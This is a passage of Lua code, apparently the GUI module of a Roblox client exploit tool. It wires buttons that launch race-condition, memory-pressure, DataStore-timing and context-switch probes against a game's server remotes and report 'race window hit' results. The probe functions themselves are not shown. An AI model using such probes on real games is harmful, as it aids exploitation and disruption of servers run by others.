            if not bestResult or #result.deltas>#bestResult.deltas then
                bestResult=result
            end
            -- Adjust delay based on result
            if #result.deltas==0 then
                delay=delay*0.85  -- reduce delay to get deeper into r1's execution
            end
            task.wait(0.5)
        end

        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        SS_STATUS.Text=bestResult and #bestResult.deltas>0 and
            "race window hit — "..#bestResult.deltas.." delta(s)" or
            "no race effect observed"
        SS_STATUS.TextColor3=#(bestResult and bestResult.deltas or {})>0 and
            Color3.fromRGB(255,140,40) or C.MUTED
        tw(RACE_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,140,40)})
        busy=false
    end)
end)

-- ── MEMORY PRESSURE ───────────────────────────────────────────────────────────
MEM_BTN.MouseButton1Click:Connect(function()
    if busy then return end
    local r1,_,r1n = getRemotes()
    if not r1 then
        SS_STATUS.Text="enter a remote name"; SS_STATUS.TextColor3=Color3.fromRGB(255,80,80); return
    end
    busy=true
    clearLog()
    tw(MEM_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,20,20)})
    SS_STATUS.Text="applying pressure..."; SS_STATUS.TextColor3=Color3.fromRGB(255,80,80)
    addLogSep("MEMORY PRESSURE PROBE — "..r1n)

    task.spawn(function()
        local result=probeMemoryPressure(r1,nil,addLog)
        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        SS_STATUS.Text=result.gcDetected and
            ("GC pause: %.0fms spike"):format(result.gcSpike and result.gcSpike.latency or 0) or
            "no GC spike detected"
        SS_STATUS.TextColor3=result.gcDetected and Color3.fromRGB(255,80,80) or C.MUTED
        tw(MEM_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,80,80)})
        busy=false
    end)
end)

-- ── DATASTORE WINDOW ─────────────────────────────────────────────────────────
DS_BTN.MouseButton1Click:Connect(function()
    if busy then return end
    busy=true
    clearLog()
    tw(DS_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(20,60,30)})
    SS_STATUS.Text="scanning DS window..."; SS_STATUS.TextColor3=Color3.fromRGB(80,210,100)
    addLogSep("DATASTORE WINDOW SCAN")

    task.spawn(function()
        local result=scanDataStoreWindow(addLog)
        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        SS_STATUS.Text=result.firstChange and
            ("DS loaded at %.0fms"):format(result.firstChange) or
            "no DS load detected"
        SS_STATUS.TextColor3=result.firstChange and
            Color3.fromRGB(80,210,100) or C.MUTED
        tw(DS_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,210,100)})
        busy=false
    end)
end)

-- ── CONTEXT SWITCH ────────────────────────────────────────────────────────────
CTX_BTN.MouseButton1Click:Connect(function()
    if busy then return end
    local r1,r2,r1n,r2n=getRemotes()
    if not r1 then
        SS_STATUS.Text="enter primary remote"; SS_STATUS.TextColor3=Color3.fromRGB(255,80,80); return
    end
    if not r2 then r2=r1; r2n=r1n end
    busy=true
    clearLog()
    tw(CTX_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(50,30,80)})
    SS_STATUS.Text="probing context switch..."; SS_STATUS.TextColor3=Color3.fromRGB(168,120,255)
    addLogSep("CONTEXT SWITCH PROBE — "..r1n.." / "..r2n)

    task.spawn(function()
        local results=probeContextSwitch(r1,r2,addLog)
        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        local best=results[1]
        SS_STATUS.Text=best and best.deltas>0 and
            ("switch interference: "..best.tag) or
            "no interference detected"
        SS_STATUS.TextColor3=best and best.deltas>0 and
            Color3.fromRGB(168,120,255) or C.MUTED
        tw(CTX_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(168,120,255)})
        busy=false
    end)
end)

-- Auto-populate remote from RBOX
P_SS:GetPropertyChangedSignal("Visible"):Connect(function()
    if P_SS.Visible and G.RBOX and G.RBOX.Text~="" and R1_BOX.Text=="" then
        R1_BOX.Text=G.RBOX.Text
    end
end)

if G.addTab then
    G.addTab("sside","SSIDE",P_SS)
else
    warn("[Oracle] G.addTab not found")
end
